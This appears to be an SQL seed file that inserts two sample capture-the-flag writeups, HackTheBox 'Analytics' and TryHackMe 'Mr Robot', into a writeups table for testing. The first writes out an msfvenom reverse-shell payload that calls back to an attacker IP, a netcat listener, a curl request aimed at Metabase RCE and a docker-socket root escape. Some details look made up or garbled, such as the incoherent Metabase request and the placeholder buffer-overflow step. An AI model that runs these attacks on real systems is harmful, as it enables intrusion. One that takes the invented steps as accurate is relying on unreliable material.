/*
  # Insert sample writeups

  1. Content
    - Add two sample writeups for testing
    - Include full markdown content
    - Set as published
*/

INSERT INTO writeups (
  title,
  slug,
  content,
  platform,
  difficulty,
  points,
  tags,
  published,
  description
) VALUES
(
  'HackTheBox: Analytics',
  'hackthebox-analytics',
  '# HackTheBox: Analytics

## Reconnaissance

Initial scan revealed a Metabase instance running on port 3000. Version number exposed in response headers indicated a known RCE vulnerability.

## Exploitation 

Used CVE-2023-38646 to achieve remote code execution:

```bash
# Generate reverse shell payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f elf -o shell.elf

# Setup listener
nc -lvnp 4444

# Trigger RCE via Metabase API
curl -X POST http://analytics.htb:3000/api/setup/validate -d "token=setup-token&engine=h2&details=JDBC:SHELL:/bin/bash+-c+base64+-d|bash"
```

Got initial foothold as metabase user.

## Privilege Escalation

Found docker socket exposed at /var/run/docker.sock. Used this to escape container:

```bash
# List containers
docker ps

# Mount host filesystem and get root shell
docker run -v /:/mnt -it ubuntu chroot /mnt sh
```

Root flag obtained from /root/root.txt.

## Key Learnings

- Always check version numbers in response headers
- Docker socket exposure can lead to container escape
- Keep Metabase updated to prevent RCE',
  'hackthebox',
  'Moyen',
  40,
  ARRAY['RCE', 'Docker Escape', 'Metabase'],
  true,
  'Exploitation d''une vulnérabilité Metabase menant à une évasion de conteneur Docker.'
),
(
  'TryHackMe: Mr Robot CTF',
  'tryhackme-mr-robot',
  '# TryHackMe: Mr Robot CTF

## Enumération

Scan nmap initial :
```bash
nmap -sC -sV -p- 10.10.10.100
```

Découverte :
- WordPress sur port 80
- Robot.txt avec entrées intéressantes
- Dictionnaire personnalisé créé à partir des références Mr Robot

## Exploitation WordPress

1. Bruteforce réussi sur wp-login.php avec fsociety.dic
2. Upload de reverse shell via éditeur de thème
3. RCE obtenu comme www-data

## Élévation de privilèges 

Buffer overflow dans binaire SUID :

```c
// Analyse du binaire
void vulnerable() {
  char buffer[64];
  gets(buffer); // Vulnérable !
}

// Exploitation
./generate_payload.py > payload
cat payload | ./buffer
```

Root obtenu via stack overflow classique.

## Flags

1. Flag1: Trouvé dans key-1-of-3.txt
2. Flag2: Dans la base MySQL WordPress
3. Flag3: Dans /root/key-3-of-3.txt

## Apprentissages

- Toujours vérifier robots.txt
- Wordlists personnalisées plus efficaces
- Binaires SUID à surveiller',
  'tryhackme',
  'Moyen',
  30,
  ARRAY['WordPress', 'Buffer Overflow', 'Privilege Escalation'],
  true,
  'Exploitation WordPress et élévation de privilèges via débordement de tampon.'
);